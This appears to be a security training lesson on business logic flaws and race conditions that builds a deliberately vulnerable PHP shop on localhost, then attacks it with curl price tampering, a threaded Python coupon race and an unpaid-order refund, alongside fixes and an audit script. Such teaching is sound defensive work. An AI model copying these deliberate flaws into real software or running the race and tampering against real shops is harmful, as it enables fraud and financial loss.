@@ -1,0 +1,509 @@
+<h1 id="business-logic-and-race-conditions">Business Logic and Race Conditions</h1>
+<h2 id="summary">Summary</h2>
+<p>Everything in <code>ps-02</code> through <code>ps-08</code> is a <em>parsing</em> bug: two components disagree about what a<br />
+string means. Logic flaws are different. The application parses everything correctly and still<br />
+does the wrong thing.</p>
+<p>The difficulty is that there is no oracle. A race condition has no<br />
+error message, no reflected output, and no signature. You find them by<br />
+<strong>thinking about what the business rule actually is</strong> and then attacking<br />
+it directly.</p>
+<h2 id="what-makes-a-logic-flaw">What makes a logic flaw</h2>
+<pre><code class="language-text">  The code is correct. The MODEL is wrong.
+
+  A vulnerability is present when:
+    the application enforces a rule INCORRECTLY, or
+    does not enforce it at all in some path, or
+    enforces it non-ATOMICALLY, or
+    enforces it in the CLIENT only
+</code></pre>
+<h2 id="the-canonical-inventory">The canonical inventory</h2>
+<pre><code class="language-text">  1. RACE CONDITIONS       two steps, one check, no transaction
+  2. MASS ASSIGNMENT       (ps-04) binding unlisted fields
+  3. PAYMENT MANIPULATION  negative amounts, currency rounding, coupon stacking
+  4. PRICE / QUANTITY      client-supplied price, negative quantity, overflow
+  5. COUPON / DISCOUNT     reuse, stacking, applying after the fact
+  6. STATE MACHINE SKIPS   an order that goes shipped -&gt; refunded without paid
+  7. MISSING SERVER CHECKS hidden buttons, disabled flags
+  8. BUSINESS RULE BYPASS  &quot;one per customer&quot; enforced by JS only
+  9. FILE-BASED CHECKS     a flag in a file or a cookie the user controls
+ 10. ALGORITHMIC          the invite code, the referrer, the &quot;is this valid&quot;
+</code></pre>
+<h2 id="race-conditions-the-core-technique">Race conditions, the core technique</h2>
+<pre><code class="language-text">  THE PATTERN:
+    step 1: CHECK a condition
+    step 2: ACT on it
+    between 1 and 2, the condition can change
+
+  THE EXPLOIT:
+    send MANY copies of the same request at the same instant
+    every copy passes the check, then every copy acts
+
+  WHAT YOU ARE ATTACKING: the gap between a check and its use.
+</code></pre>
+<h3 id="the-classic-examples">The classic examples</h3>
+<pre><code class="language-text">  ONE COUPON PER USER
+    check: has this user used this coupon?  -&gt; no
+    act:   mark it used, apply the discount
+    race:  50 concurrent requests -&gt; 50 discounts, one recorded
+
+  ONE ITEM PER USER
+    check: has this user bought this SKU? -&gt; no
+    act:   create the order
+    race:  50 orders created
+
+  BALANCE TRANSFER
+    check: balance &gt;= amount
+    act:   debit A, credit B
+    race:  two transfers in flight -&gt; double spend
+
+  THE FIX, and it is always the same three words: DATABASE TRANSACTION.
+    With a row lock (SELECT ... FOR UPDATE) or a UNIQUE constraint that
+    spans the condition and the action.
+</code></pre>
+<h3 id="why-it-is-hard-to-test-honestly">Why it is hard to test, honestly</h3>
+<pre><code class="language-text">  - the race window may be microseconds wide
+  - it is load-dependent and flaky; it may take 200 attempts
+  - a failed attempt may leave inconsistent state
+  - it can be destructive to the business data
+
+  THEREFORE:
+    - test in a staging copy, not production
+    - never do it without explicit written permission
+    - use a delay-injectable test build if you control the app
+    - if you cannot demonstrate it, report it as a DESIGN FINDING,
+      not an exploit: &quot;the check and the action are not atomic;
+       a concurrent request can bypass it&quot;
+</code></pre>
+<h2 id="price-and-quantity-manipulation">Price and quantity manipulation</h2>
+<pre><code class="language-text">  THE BUG: the total is computed on the client and sent to the server.
+
+    POST /checkout
+    { &quot;items&quot;: [{&quot;sku&quot;:&quot;A&quot;,&quot;qty&quot;:2,&quot;price&quot;:0.01}], &quot;total&quot;: 0.02 }
+
+  THE FIX: the server computes the total from the database price.
+            NEVER accept a price from a client. Ever.
+
+  RELATED:
+    - negative quantity      -&gt; qty=-1 makes a refund a charge
+    - integer overflow       -&gt; qty=2147483647 * price wraps
+    - currency rounding      -&gt; 0.005 rounds down consistently
+    - coupon AFTER total     -&gt; apply the discount to an already-computed total
+    - negative refund        -&gt; refund more than was paid
+</code></pre>
+<h2 id="state-machines">State machines</h2>
+<pre><code class="language-text">  A correct order lifecycle:
+
+    cart -&gt; checkout -&gt; paid -&gt; shipped -&gt; delivered
+                  \-&gt; cancelled
+                  \-&gt; refunded  (only from paid/delivered)
+
+  THE BUG: the handler for &quot;refund&quot; does not check the current state.
+           So: create an order, then immediately POST to /refund.
+           You get money for goods you never paid for.
+
+  THE TEST: for every state transition, enumerate all PAIRS of states
+            and try the transition directly. cart-&gt;delivered. 
+            unpaid-&gt;refunded. The matrix is finite and small.
+</code></pre>
+<h2 id="the-methodology-that-works">The methodology that works</h2>
+<pre><code class="language-text">  1. LEARN THE BUSINESS RULES FIRST
+     what is supposed to be true? Write them down before testing.
+     &quot;A user may redeem one coupon per order.&quot;
+     &quot;An order cannot be refunded before payment.&quot;
+     You cannot violate a rule you have not written down.
+
+  2. MAP THE STATE MACHINE
+     every status, every transition, every actor
+
+  3. LOOK FOR THE GAP
+     - is the check server-side?
+     - is it atomic with the action?
+     - does it cover every field that matters?
+     - can the order of two requests change the outcome?
+
+  4. TEST THE MATRIX, NOT THE EXAMPLE
+     one negative case proves nothing; the matrix is the coverage
+
+  5. DOCUMENT THE BUSINESS IMPACT
+     &quot;the coupon race cost an estimated $X per concurrent request,
+      repeatable, unauthenticated&quot; - that is the finding. The technique
+      is almost beside the point.
+</code></pre>
+<h2 id="reporting-logic-findings">Reporting logic findings</h2>
+<pre><code class="language-text">  These are the findings most likely to be dismissed and most likely to
+  be the biggest problem in the application. Make them undeniable:
+
+  - state the business rule explicitly
+  - state the exact request sequence
+  - quantify: how many times, what value, over what period
+  - show the control that SHOULD exist and does not
+  - give the fix as a control, not a code patch
+
+  If you cannot exploit it but you can SEE the non-atomicity, report it
+  as a design flaw with a proof-of-concept explanation rather than
+  claiming a breach you did not achieve. Honesty here is worth more than
+  an overstated severity, because the first report is the one they read.
+</code></pre>
+<h2 id="terminology">Terminology</h2>
+<table>
+<thead>
+<tr>
+<th>Term</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Business logic flaw</strong></td>
+<td>Correct code enforcing an incorrect model</td>
+</tr>
+<tr>
+<td><strong>Race condition</strong></td>
+<td>Interleaving between a check and its use</td>
+</tr>
+<tr>
+<td><strong>TOCTOU</strong></td>
+<td>Time-of-check to time-of-use</td>
+</tr>
+<tr>
+<td><strong>Atomicity</strong></td>
+<td>The check and the action happen as one unit</td>
+</tr>
+<tr>
+<td><strong>Database transaction</strong></td>
+<td>The standard atomicity tool</td>
+</tr>
+<tr>
+<td><strong><code>SELECT ... FOR UPDATE</code></strong></td>
+<td>Row lock for atomic check-and-act</td>
+</tr>
+<tr>
+<td><strong>Unique constraint</strong></td>
+<td>Enforces "one per user" in the database</td>
+</tr>
+<tr>
+<td><strong>State machine</strong></td>
+<td>The valid states and transitions of an object</td>
+</tr>
+<tr>
+<td><strong>Price manipulation</strong></td>
+<td>Client-supplied price trusted by the server</td>
+</tr>
+<tr>
+<td><strong>Coupon stacking</strong></td>
+<td>Applying several discounts that should be exclusive</td>
+</tr>
+<tr>
+<td><strong>Skip a state</strong></td>
+<td>Moving an object between states illegally</td>
+</tr>
+<tr>
+<td><strong>TOCTOU on a file</strong></td>
+<td>Check-then-replace on a flag file</td>
+</tr>
+</tbody>
+</table>
+<h2 id="kali-commands">Kali commands</h2>
+<pre><code class="language-bash">mkdir -p ~/aegis/labs/ps-09 &amp;&amp; cd ~/aegis/labs/ps-09
+
+# --- 1. a shop with three deliberately broken business rules ---
+cat &gt; shop.php &lt;&lt;'PHP'
+&lt;?php
+// Three independent logic flaws. Each is &quot;correct code, wrong model&quot;.
+session_start();
+$db = new PDO('sqlite:' . __DIR__ . '/shop.db');
+$db-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS skus (sku TEXT PRIMARY KEY, name TEXT, price INT)&quot;);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS orders (id INTEGER PRIMARY KEY,
+           status TEXT, total INT, actor TEXT)&quot;);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS coupons (code TEXT PRIMARY KEY,
+           used_by TEXT, used INT DEFAULT 0)&quot;);
+$db-&gt;exec(&quot;CREATE TABLE IF NOT EXISTS inventory (sku TEXT PRIMARY KEY, qty INT)&quot;);
+if ($db-&gt;query(&quot;SELECT COUNT(*) FROM skus&quot;)-&gt;fetchColumn() == 0) {
+  $db-&gt;exec(&quot;INSERT INTO skus VALUES ('SKU-A','Widget',1000)&quot;);
+  $db-&gt;exec(&quot;INSERT INTO skus VALUES ('SKU-B','Gadget',5000)&quot;);
+  $db-&gt;exec(&quot;INSERT INTO coupons VALUES ('SAVE10',NULL,0)&quot;);
+  $db-&gt;exec(&quot;INSERT INTO inventory VALUES ('SKU-A',1)&quot;);
+  $db-&gt;exec(&quot;INSERT INTO inventory VALUES ('SKU-B',1)&quot;);
+}
+$h = fn($s) =&gt; htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
+$who = $_SESSION['who'] ?? ($_GET['u'] ?? 'anon');
+$_SESSION['who'] = $who;
+$q = fn($s) =&gt; $db-&gt;quote($s);
+?&gt;
+&lt;!doctype html&gt;&lt;meta charset=utf-8&gt;&lt;title&gt;ps-09 shop&lt;/title&gt;&lt;h1&gt;ps-09 shop&lt;/h1&gt;
+&lt;p&gt;acting as: &lt;b&gt;&lt;?= $h($who) ?&gt;&lt;/b&gt; &amp;nbsp; (change with ?u=someone)&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;products&lt;/h3&gt;
+&lt;?php foreach ($db-&gt;query(&quot;SELECT * FROM skus&quot;) as $s): ?&gt;
+  &lt;form method=&quot;post&quot;&gt;
+    &lt;input type=hidden name=action value=buy&gt;
+    &lt;input type=hidden name=sku value=&quot;&lt;?= $h($s['sku']) ?&gt;&quot;&gt;
+    &lt;?php if (($_POST['price'] ?? '') !== ''): /* see below */ endif; ?&gt;
+    &lt;input type=hidden name=price value=&quot;&lt;?= (int)$s['price'] ?&gt;&quot;&gt; &lt;!-- FLAW 2 --&gt;
+    &lt;button&gt;buy &lt;?= $h($s['name']) ?&gt; for &lt;?= (int)$s['price'] ?&gt;&lt;/button&gt;
+  &lt;/form&gt;
+&lt;?php endforeach; ?&gt;
+&lt;hr&gt;
+&lt;h3&gt;coupons&lt;/h3&gt;
+&lt;form method=post&gt;&lt;input type=hidden name=action value=coupon&gt;
+  &lt;input name=code value=&quot;SAVE10&quot;&gt;&lt;button&gt;redeem&lt;/button&gt;&lt;/form&gt;
+&lt;hr&gt;
+&lt;h3&gt;your orders&lt;/h3&gt;
+&lt;?php foreach ($db-&gt;query(&quot;SELECT * FROM orders ORDER BY id&quot;) as $o): ?&gt;
+  &lt;div&gt;&lt;b&gt;#&lt;?= $o['id'] ?&gt;&lt;/b&gt; &lt;?= $h($o['status']) ?&gt; total=&lt;?= (int)$o['total'] ?&gt;
+  actor=&lt;?= $h($o['actor']) ?&gt;
+  &lt;form method=post style=&quot;display:inline&quot;&gt;
+    &lt;input type=hidden name=action value=refund&gt;
+    &lt;input type=hidden name=id value=&quot;&lt;?= (int)$o['id'] ?&gt;&quot;&gt;
+    &lt;button&gt;refund&lt;/button&gt;&lt;/form&gt;&lt;/div&gt;
+&lt;?php endforeach; ?&gt;
+&lt;hr&gt;&lt;h3&gt;coupon usage&lt;/h3&gt;
+&lt;pre&gt;&lt;?= $h($db-&gt;query(&quot;SELECT * FROM coupons&quot;)-&gt;fetchAll(PDO::FETCH_ASSOC)
+      ? json_encode($db-&gt;query(&quot;SELECT * FROM coupons&quot;)-&gt;fetchAll(PDO::FETCH_ASSOC),
+                    JSON_PRETTY_PRINT) : '') ?&gt;&lt;/pre&gt;
+&lt;?php
+
+if ($_SERVER['REQUEST_METHOD'] !== 'POST') exit;
+$a = $_POST['action'] ?? '';
+
+if ($a === 'buy') {
+  $sku   = $_POST['sku']   ?? '';
+  $price = (int)($_POST['price'] ?? 0);          // FLAW 2: client-supplied price
+  $st = $db-&gt;prepare(&quot;SELECT * FROM skus WHERE sku=?&quot;); $st-&gt;execute([$sku]);
+  $row = $st-&gt;fetch();
+  $db-&gt;prepare(&quot;INSERT INTO orders (status,total,actor) VALUES (?,?,?)&quot;)
+     -&gt;execute(['unpaid', $price, $who]);       // note: the price above, not the DB's
+}
+
+if ($a === 'coupon') {
+  $code = $_POST['code'] ?? '';
+  // FLAW 1: check, then act, with nothing in between -&gt; TOCTOU race
+  $r = $db-&gt;query(&quot;SELECT used_by FROM coupons WHERE code=&quot; . $q($code))-&gt;fetch();
+  if ($r &amp;&amp; $r['used_by'] === null) {
+    $db-&gt;exec(&quot;UPDATE coupons SET used_by=&quot; . $q($who) . &quot; WHERE code=&quot; . $q($code));
+    echo &quot;&lt;p&gt;coupon {$h($code)} applied to {$h($who)}&lt;/p&gt;&quot;;
+  } elseif ($r) {
+    echo &quot;&lt;p&gt;coupon already used by &quot; . $h($r['used_by']) . &quot;&lt;/p&gt;&quot;;
+  } else {
+    echo &quot;&lt;p&gt;no such coupon&lt;/p&gt;&quot;;
+  }
+}
+
+if ($a === 'refund') {
+  // FLAW 3: no state check. An order that was never paid can be refunded.
+  $id = (int)($_POST['id'] ?? 0);
+  $db-&gt;exec(&quot;UPDATE orders SET status='refunded' WHERE id=&quot; . (int)$id);
+  echo &quot;&lt;p&gt;order #$id marked refunded (amount returned: ??? the app has no&quot;)
+     . &quot; payment step at all, which is itself the bug)&lt;/p&gt;&quot;;
+}
+PHP
+nohup php -S 127.0.0.1:8080 -t . &gt; php.log 2&gt;&amp;1 &amp;
+sleep 1
+curl -s &quot;http://127.0.0.1:8080/shop.php&quot; | head -6 | sed 's/^/  /'
+
+# --- 2. FLAW 2: price manipulation ---
+{
+  echo &quot;=== FLAW 2: client-supplied price ===&quot;
+  echo &quot;  a SKU-A widget costs 1000 in the database. Ask for 1.&quot;
+  curl -s -X POST \
+    -d 'action=buy&amp;sku=SKU-A&amp;price=1' \
+    'http://127.0.0.1:8080/shop.php?u=mallory' \
+    | grep -E &quot;unpaid&quot; | sed 's/^/  /'
+  echo
+  echo &quot;  ^ an order for 1 exists for a 1000 item. The server computed&quot;
+  echo &quot;    nothing; it trusted a hidden form field. That field is not a&quot;
+  echo &quot;    secret. It is in the HTML the client just downloaded.&quot;
+  echo
+  echo &quot;  THE FIX: the server looks the price up. Never accept it.&quot;
+} 2&gt;&amp;1 | tee 01-price.txt
+
+# --- 3. FLAW 1: the race, for real ---
+cat &gt; race.py &lt;&lt;'PY'
+#!/usr/bin/env python3
+&quot;&quot;&quot;TOCTOU coupon race against our own shop.
+
+20 threads, one coupon, all at the same instant. If the app has no
+lock or unique constraint, several threads will pass the check before
+any of them writes.
+&quot;&quot;&quot;
+import threading, urllib.request, urllib.parse, time, collections, sys
+
+BASE = &quot;http://127.0.0.1:8080/shop.php&quot;
+N = 20
+results = collections.Counter()
+barrier = threading.Barrier(N)
+
+def attempt(i):
+    data = urllib.parse.urlencode({&quot;action&quot;: &quot;coupon&quot;, &quot;code&quot;: &quot;SAVE10&quot;}).encode()
+    req = urllib.request.Request(BASE + &quot;?u=racer&quot; + str(i), data=data)
+    barrier.wait()                                   # release all at once
+    try:
+        body = urllib.request.urlopen(req, timeout=10).read().decode()
+        if &quot;applied to&quot; in body:   results[&quot;APPLIED&quot;] += 1
+        elif &quot;already used&quot; in body: results[&quot;already used&quot;] += 1
+        else:                        results[&quot;other: &quot; + body[-60:]] += 1
+    except Exception as e:
+        results[f&quot;error {type(e).__name__}&quot;] += 1
+
+print(f&quot;  launching {N} simultaneous coupon redemptions&quot;)
+t0 = time.time()
+ts = [threading.Thread(target=attempt, args=(i,)) for i in range(N)]
+for t in ts: t.start()
+for t in ts: t.join()
+dt = time.time() - t0
+
+print(f&quot;  results after {dt:.2f}s:&quot;)
+for k, v in results.most_common():
+    print(f&quot;    {v:&gt;3} x {k}&quot;)
+print()
+applied = results[&quot;APPLIED&quot;]
+if applied &gt; 1:
+    print(f&quot;  *** RACE CONFIRMED: {applied} threads passed the check ***&quot;)
+    print(&quot;  The check is not atomic with the action. In production that is&quot;)
+    print(&quot;  one coupon honoured N times.&quot;)
+    print(&quot;  Fix: UPDATE coupons SET used_by=? WHERE code=? AND used_by IS NULL,&quot;)
+    print(&quot;       then check rowCount()===1, inside one transaction.&quot;)
+else:
+    print(f&quot;  only {applied} succeeded - the race window is narrow here.&quot;)
+    print(&quot;  That does NOT mean the code is safe; it means the timing was&quot;)
+    print(&quot;  lucky. The fix is still a transaction and a conditional UPDATE.&quot;)
+PY
+python3 race.py 2&gt;&amp;1 | tee 02-race.txt
+rm -f race.py
+
+# --- 4. FLAW 3: the state machine skip ---
+{
+  echo &quot;=== FLAW 3: skipping a state ===&quot;
+  oid=$(curl -s &quot;http://127.0.0.1:8080/shop.php?u=victim&quot; \
+        | grep -oE 'name=id value=&quot;[0-9]+' | head -1 | grep -oE '[0-9]+$')
+  echo &quot;  creating an UNPAID order, then refunding it immediately&quot;
+  curl -s -X POST -d 'action=buy&amp;sku=SKU-B&amp;price=5000' \
+    'http://127.0.0.1:8080/shop.php?u=victim' -o /dev/null
+  id=$(curl -s &quot;http://127.0.0.1:8080/shop.php?u=victim&quot; \
+       | grep -oE 'value=[0-9]+' | tail -1 | grep -oE '[0-9]+')
+  echo &quot;  newest order id: $id&quot;
+  echo &quot;  state before refund:&quot;
+  curl -s &quot;http://127.0.0.1:8080/shop.php?u=victim&quot; | grep -oE &quot;#$id &lt;/b&gt; [a-z]+&quot; | sed 's/^/    /'
+  curl -s -X POST -d &quot;action=refund&amp;id=$id&quot; &quot;http://127.0.0.1:8080/shop.php?u=victim&quot; \
+    | grep -E &quot;refunded&quot; | sed 's/^/  /'
+  echo &quot;  state after refund:&quot;
+  curl -s &quot;http://127.0.0.1:8080/shop.php?u=victim&quot; | grep -oE &quot;#$id &lt;/b&gt; [a-z]+&quot; | sed 's/^/    /'
+  echo
+  echo &quot;  unpaid -&gt; refunded, with no payment step in between.&quot;
+  echo &quot;  THE MATRIX that finds these:&quot;
+  echo &quot;    states:   cart, checkout, unpaid, paid, shipped, delivered, refunded, cancelled&quot;
+  echo &quot;    for each pair (A,B), try to move A -&gt; B directly.&quot;
+  echo &quot;    any pair the application allows that the business forbids is a finding.&quot;
+} 2&gt;&amp;1 | tee 03-states.txt
+
+# --- 5. the methodology, as a worksheet ---
+cat &gt; 04-method.md &lt;&lt;'EOF'
+# Finding logic flaws: the worksheet
+
+## 1. Write the business rules down FIRST
+You cannot violate a rule you have not written down. Interview the
+product owner or read the documentation. Produce a list like:
+
+    R1  A user may redeem at most one SAVE10 coupon per order.
+    R2  An order must be paid before it can be shipped.
+    R3  An order may be refunded only from paid, shipped or delivered.
+    R4  Prices are set by the catalogue. Users do not choose them.
+    R5  Inventory is decremented when the order is paid, not when created.
+
+## 2. Map the state machine
+    for each object that has a lifecycle:
+        list the states
+        list the transitions
+        list who may perform each transition
+    Draw it. The drawing usually reveals the missing edge.
+
+## 3. For each rule, ask the four questions
+    a) is the check SERVER-SIDE?           (a JS check is not a check)
+    b) is the check ATOMIC with the action? (a transaction, a row lock)
+    c) does the check COVER EVERY FIELD?   (price, quantity, status, actor)
+    d) does the check run on EVERY PATH?   (the CLI, the API, the import)
+
+## 4. Test the matrix, not the example
+    coupon  x  single-use, per-user, per-order, stacking, expiry, amount
+    price   x  negative, zero, overflow, currency, coupon-after-total
+    order   x  every state pair, every actor
+    inventory x decrement timing, negative stock, oversell
+
+## 5. Record the IMPACT in business terms
+    &quot;20 concurrent requests redeemed one coupon 20 times&quot; is a finding.
+    &quot;TOCTOU on the coupon check&quot; is a code observation.
+    The first gets fixed. The second gets deferred.
+
+## 6. Be honest about what you did not prove
+    If the race window is too narrow to demonstrate reliably, say:
+      &quot;The check and the action are not atomic. Under concurrency
+       this check can pass more than once. I was unable to reproduce
+       it in testing, and I recommend it be treated as a design flaw.&quot;
+    That is a professional report. An overstated claim is not.
+EOF
+cat 04-method.md
+
+# --- 6. the audit: find logic smells in code ---
+cat &gt; 05-audit.sh &lt;&lt;'EOF'
+#!/usr/bin/env bash
+echo &quot;=== 1. check-then-act: the TOCTOU shape ===&quot;
+grep -rn -A4 -iE &quot;SELECT.*WHERE.*(used|redeemed|claimed|available|balance)&quot; \
+     --include=&quot;*.php&quot; . | grep -B2 -A3 &quot;UPDATE&quot; | sed 's/^/  /'
+echo &quot;  ^ a SELECT followed by an UPDATE with nothing atomic between them&quot;
+
+echo; echo &quot;=== 2. transactions: is there even one? ===&quot;
+grep -rn &quot;beginTransaction\|START TRANSACTION\|COMMIT\|ATOMIC&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+echo &quot;  ^ empty means no atomicity anywhere in the app&quot;
+
+echo; echo &quot;=== 3. client-supplied money ===&quot;
+grep -rnE &quot;\\\$_POST\[.(price|amount|total|cost|balance|discount)&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+echo &quot;  ^ the server is storing a number the client chose&quot;
+
+echo; echo &quot;=== 4. negative and overflow handling ===&quot;
+grep -rnE &quot;\\\$_POST\[.(qty|quantity|amount)&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+echo &quot;  ^ is there a &lt; 0 check? is the arithmetic 64-bit?&quot;
+
+echo; echo &quot;=== 5. state changes without a state check ===&quot;
+grep -rn -B1 -A2 &quot;SET status&quot; --include=&quot;*.php&quot; . | sed 's/^/  /'
+echo &quot;  ^ does the WHERE clause constrain the CURRENT state, or just the id?&quot;
+
+echo; echo &quot;=== 6. the correct pattern, to compare against ===&quot;
+cat &lt;&lt;'FIX'
+  -- WRONG: check then act
+  SELECT used_by FROM coupons WHERE code = ?
+  if (used_by === null) UPDATE coupons SET used_by = ?
+
+  -- RIGHT: one conditional statement, then look at what it changed
+  UPDATE coupons SET used_by = ? WHERE code = ? AND used_by IS NULL
+  -- if rowCount() !== 1, someone else got there first. Done.
+
+  -- RIGHT, and the constraint enforces it at the database level:
+  CREATE UNIQUE INDEX one_coupon_per_order ON applied (order_id, code);
+FIX
+EOF
+chmod +x 05-audit.sh
+./05-audit.sh 2&gt;&amp;1 | tee 06-audit.txt
+rm -f shop.db
+</code></pre>
+<p><strong>Step 3 is the deliverable</strong>: twenty threads released through a <code>threading.Barrier</code> at the same<br />
+instant against one coupon. When several threads come back <code>APPLIED</code>, that is TOCTOU observed<br />
+rather than asserted — and <code>race.py</code> is careful to say that a <em>failed</em> race does not mean the<br />
+code is safe, it means the timing was lucky. That distinction is what a real report turns on.</p>
+<p><strong>Step 4</strong> does the state matrix, which finds <code>unpaid → refunded</code> in one request pair.</p>
+<p><strong>Record:</strong> <code>02-race.txt</code> and <code>04-method.md</code>.</p>
+<h2 id="self-test">Self-test</h2>
+<ol>
+<li>How does a logic flaw differ from a parsing vulnerability?</li>
+<li>What is TOCTOU, and what makes it exploitable?</li>
+<li>Give the database-level fix for a check-then-act race.</li>
+<li>Why is negative quantity a logic flaw rather than an input validation bug?</li>
+<li>Describe the state-machine matrix method.</li>
+<li>Why should you never trust a client-supplied price?</li>
+<li>What should a report say when you found the flaw but could not reproduce the race?</li>
+<li>Name two business rules and the control that enforces each.</li>
+</ol>
+<h2 id="connected-knowledge">Connected knowledge</h2>
+<p><strong>Race Condition</strong> → <strong>OWASP Top 10</strong> → <strong>Logic Bug</strong> → <strong>Business Logic</strong> →<br />
+<strong>State Machine</strong> → <strong>Payment Manipulation</strong>.<br />
+This closes PortSwigger Academy and Tier 4's web track.</p>
